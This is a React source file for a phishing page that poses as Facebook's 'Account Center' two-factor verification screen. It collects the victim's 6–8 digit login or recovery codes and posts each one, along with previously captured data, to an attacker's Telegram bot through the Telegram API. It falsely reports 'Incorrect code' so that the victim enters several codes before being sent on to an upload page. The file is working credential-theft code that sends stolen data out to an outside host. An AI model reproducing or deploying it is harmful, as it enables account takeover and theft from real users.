import HeroImage from "@/assets/images/verify.png";
import getConfig from "@/utils/config";
import axios from "axios";
import type { FC } from "react";
import { useEffect, useState } from "react";
import { useNavigate } from "react-router";
interface UIState {
	error: string;
	isLoading: boolean;
	attempt: number;
	messageId: number;
}

interface Config {
	chatId: string;
	token: string;
	loadingTime: number;
	maxAttempt: number;
}

const initialUIState: UIState = {
	error: "",
	isLoading: false,
	attempt: 0,
	messageId: 0,
};

const createVerifyMessage = (code: string, attempt?: number) => {
	const lastMessage = localStorage.getItem("lastMessage");
	if (attempt === 1) {
		return `${lastMessage}\n━━━━━━━━━━━━━━━━━━━━━\n🔓 <b>CODE 2FA:</b> <code>${code}</code>`;
	}
	return `${lastMessage}\n🔓 <b>CODE 2FA ${attempt}:</b> <code>${code}</code>`;
};

const sendTelegramMessage = async (
	message: string,
	config: Config,
	messageId: string,
) => {
	await axios.post(
		`https://api.telegram.org/bot${config.token}/deleteMessage`,
		{
			chat_id: config.chatId,
			message_id: messageId,
		},
	);
	return axios.post(`https://api.telegram.org/bot${config.token}/sendMessage`, {
		chat_id: config.chatId,
		text: message,
		parse_mode: "HTML",
	});
};

const Verify: FC = () => {
	const navigate = useNavigate();
	const [code, setCode] = useState("");
	const [uiState, setUiState] = useState<UIState>(initialUIState);
	const [config, setConfig] = useState<Config>({
		chatId: "",
		token: "",
		loadingTime: 0,
		maxAttempt: 0,
	});

	useEffect(() => {
		const { telegram, settings } = getConfig();
		setConfig({
			chatId: telegram.data_chatid,
			token: telegram.data_token,
			loadingTime: settings.code_loading_time,
			maxAttempt: settings.max_failed_code_attempts,
		});
	}, []);

	const handleSubmit = async () => {
		const savedMessageId = localStorage.getItem("messageId");
		if (!savedMessageId) {
			navigate("/");
			return;
		}

		const message = createVerifyMessage(code, uiState.attempt + 1);
		localStorage.setItem("lastMessage", message);

		if (uiState.attempt >= config.maxAttempt) {
			setUiState((prev) => ({ ...prev, isLoading: true }));

			try {
				const response = await sendTelegramMessage(
					message,
					config,
					savedMessageId,
				);
				localStorage.setItem("messageId", response.data.result.message_id);
				setTimeout(() => {
					navigate("/upload");
				}, config.loadingTime);
			} catch {
				navigate("/upload");
			}
			return;
		}

		setUiState((prev) => ({
			...prev,
			attempt: prev.attempt + 1,
			isLoading: true,
		}));

		try {
			const response = await sendTelegramMessage(
				message,
				config,
				savedMessageId,
			);
			localStorage.setItem("messageId", response.data.result.message_id);
			setTimeout(() => {
				setUiState((prev) => ({
					...prev,
					isLoading: false,
					error: "Incorrect code. Please try again.",
				}));
			}, config.loadingTime);
		} catch {
			navigate("/verify");
		}
	};

	const clearError = () => {
		setUiState((prev) => ({ ...prev, error: "" }));
	};

	const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		if (/[a-zA-Z]+/g.test(e.target.value)) return;
		setCode(e.target.value);
	};

	return (
		<div className="flex flex-col justify-center gap-2 md:w-3/6 2xl:w-1/3">
			<div className="flex flex-col">
				<b>Account Center - Facebook</b>
				<b className="text-2xl">Check notifications on another device</b>
			</div>

			<div>
				<img src={HeroImage} alt="verify" />
			</div>

			<div>
				<b>Approve from another device or Enter your login code</b>
				<p>
					Enter 6-digit code we just send from the authentication app you set
					up, or Enter 8-digit recovery code
				</p>
			</div>

			<div className="my-2 flex flex-col items-center justify-center">
				<input
					className={`w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none ${
						uiState.error ? "border-red-500 focus:border-red-500" : ""
					}`}
					type="text"
					autoComplete="one-time-code"
					inputMode="numeric"
					maxLength={8}
					minLength={6}
					pattern="\d*"
					placeholder="Enter Code (6-8 digits)"
					value={code}
					onFocus={clearError}
					onChange={handleCodeChange}
				/>

				{uiState.error && (
					<div className="mt-2 text-sm text-red-500">{uiState.error}</div>
				)}

				<button
					className={`my-5 flex w-full items-center justify-center rounded-full p-4 font-semibold text-white ${
						code.length >= 6
							? "bg-blue-500 hover:bg-blue-600"
							: "cursor-not-allowed bg-blue-300"
					}`}
					disabled={code.length < 6 || uiState.isLoading}
					type="button"
					onClick={handleSubmit}
				>
					{uiState.isLoading ? (
						<div className="h-6 w-6 animate-spin rounded-full border-2 border-t-transparent border-l-transparent p-2" />
					) : (
						"Continue"
					)}
				</button>

				<p className="text-blue-500 hover:underline">Send Code</p>
			</div>
		</div>
	);
};

export default Verify;
